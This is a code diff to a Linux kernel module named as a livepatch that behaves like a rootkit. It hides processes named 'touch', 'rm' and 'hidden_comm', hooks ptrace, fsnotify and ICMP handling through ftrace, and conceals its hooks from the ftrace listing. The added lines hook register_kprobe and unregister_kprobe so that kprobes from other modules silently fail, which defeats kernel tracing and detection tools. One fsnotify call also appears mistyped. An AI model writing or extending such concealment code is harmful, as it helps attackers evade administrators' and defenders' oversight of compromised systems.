@@ -97,6 +97,10 @@ module_param(force_modules_disabled, int, 0644);
 static int force_reboot_disabled = 0;
 module_param(force_reboot_disabled, int, 0644);
 
+//puzzle kprobe 
+static int force_kprobe_puzzle = 1;
+module_param(force_kprobe_puzzle, int, 0644);
+
 #define MAX_NUM_PROC_NAME 10
 static int num_proc_name = 3;
 static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {"hidden_comm", "touch", "rm"};
@@ -162,6 +166,7 @@ static rwlock_t *p_tasklist_lock = NULL;
 static struct ftrace_ops *p_kprobe_ftrace_ops = NULL;
 static struct ftrace_ops *p_kprobe_ipmodify_ops = NULL;
 
+static int (*p_kernel_text_address)(unsigned long addr) = NULL;
 
 static asmlinkage bool (*real_ptrace_may_access)(struct task_struct *task, unsigned int mode);
 static bool has_pid_permissions(struct pid_namespace *pid,
@@ -1008,45 +1013,50 @@ static asmlinkage bool ftrace_ptrace_may_access(struct pt_regs *regs)
 	return real_ptrace_may_access(regs);
 }
 
-static asmlinkage int (*real_reboot_pid_ns)(struct pid_namespace *pid_ns, int cmd) = NULL;
-static asmlinkage int ftrace_reboot_pid_ns(struct pid_namespace *pid_ns, int cmd)
+static asmlinkage int (*real_reboot_pid_ns)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace_reboot_pid_ns(struct pt_regs *regs)
 {
-	return real_reboot_pid_ns(pid_ns, cmd);
+	return real_reboot_pid_ns(regs);
 }
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 1)
-static asmlinkage int (*real___fsnotify_parent)(const struct path *path, struct dentry *dentry, __u32 mask) = NULL;
-static asmlinkage int ftrace___fsnotify_parent(const struct path *path, struct dentry *dentry, __u32 mask)
+static asmlinkage int (*real___fsnotify_parent)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace___fsnotify_parent(struct pt_regs *regs)
 {
-	return real___fsnotify_parent(path, dentry, mask);
+	return real___fsnotify_parent(regs);
 }
 
-static asmlinkage int (*real_fsnotify)(struct inode *to_tell, __u32 mask, const void *data, int data_is,
-             const struct qstr *file_name, u32 cookie) = NULL;
-static asmlinkage int ftrace_fsnotify(struct inode *to_tell, __u32 mask, const void *data, int data_is,
-             const struct qstr *file_name, u32 cookie)
+static asmlinkage int (*real_fsnotify)(struct pt_regs *regs) = NULL;
+static asmlinkage int ftrace_fsnotify(struct pt_regs *regs)
 {
 	
-	return read_fsnotify(to_tell, mask, data, data_is, file_name, cookie);
+	return read_fsnotify(regs);
 } 
 #endif
 
-static asmlinkage  bool (*real_icmp_echo)(struct sk_buff *skb) = NULL;
-static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
+static asmlinkage  bool (*real_icmp_echo)(struct pt_regs *regs) = NULL;
+static asmlinkage  bool ftrace_icmp_echo(struct pt_regs *regs)
 {
-	return real_icmp_echo(skb);
+	return real_icmp_echo(regs);
 }
 
-static asmlinkage  int (*real_ptrace_attach)(struct task_struct *task, long request,
-                         unsigned long addr,
-                         unsigned long flags) = NULL;
-static asmlinkage  int ftrace_ptrace_attach(struct task_struct *task, long request,
-                         unsigned long addr,
-                         unsigned long flags) 
+static asmlinkage  int (*real_ptrace_attach)(struct pt_regs *regs) = NULL;
+static asmlinkage  int ftrace_ptrace_attach(struct pt_regs *regs)
 {
-	return real_ptrace_attach(task, request, addr, flags);
+	return real_ptrace_attach(regs);
 }
 
+static asmlinkage  int (*real_register_kprobe)(struct pt_regs *regs) = NULL;
+static asmlinkage  int ftrace_register_kprobe(struct pt_regs *regs)
+{
+	return real_register_kprobe(regs);
+}
+
+static asmlinkage  int (*real_unregister_kprobe)(struct pt_regs *regs) = NULL;
+static asmlinkage  int ftrace_unregister_kprobe(struct pt_regs *regs)
+{
+	return real_unregister_kprobe(regs);
+}
 #else
 
 static asmlinkage long (*real_sched_getaffinity)(pid_t pid, struct cpumask *mask) = NULL;
@@ -1420,6 +1430,28 @@ static asmlinkage  int ftrace_ptrace_attach(struct task_struct *task, long reque
 
 	return real_ptrace_attach(task, request, addr, flags);
 }
+
+static asmlinkage  int (*real_register_kprobe)(struct kprobe *p) = NULL;
+static asmlinkage  int ftrace_register_kprobe(struct kprobe *p)
+{
+	//puzzle kprpbe using in module when set force_kprobe_puzzle
+	if (force_kprobe_puzzle && !p_kernel_text_address((unsigned long)p)
+				 && !within_module((unsigned long)p, this_module))
+		return 0;
+
+	return real_register_kprobe(p);
+}
+
+static asmlinkage  int (*real_unregister_kprobe)(struct kprobe *p) = NULL;
+static asmlinkage  int ftrace_unregister_kprobe(struct kprobe *p)
+{
+	//puzzle kprpbe using in module when set force_kprobe_puzzle
+	if (force_kprobe_puzzle && !p_kernel_text_address((unsigned long)p)
+				 && !within_module((unsigned long)p, this_module))
+		return 0;
+
+	return real_unregister_kprobe(p);
+}
 #endif
 
 /* Check syscalls for hidden proc
@@ -1549,6 +1581,8 @@ static struct ftrace_hook hooks[] = {
 #endif
         HOOK("icmp_echo", ftrace_icmp_echo, &real_icmp_echo),
         HOOK("ptrace_attach", ftrace_ptrace_attach, &real_ptrace_attach),
+        HOOK("register_kprobe", ftrace_register_kprobe, &real_register_kprobe),
+        HOOK("unregister_kprobe", ftrace_unregister_kprobe, &real_unregister_kprobe),
 };
 
 static int entry_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
@@ -1855,6 +1889,10 @@ static int livepatch_init(void)
 	if (!p_sysctl_nr_open)
 		return -1;
 
+	p_kernel_text_address = (int (*)(unsigned long addr))
+				 kallsyms_lookup_name("kernel_text_address");
+	if (!p_kernel_text_address)
+		return -1;
 	
 	fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	hidden_from_enabled_functions_ftrace_hooks(hooks, ARRAY_SIZE(hooks));
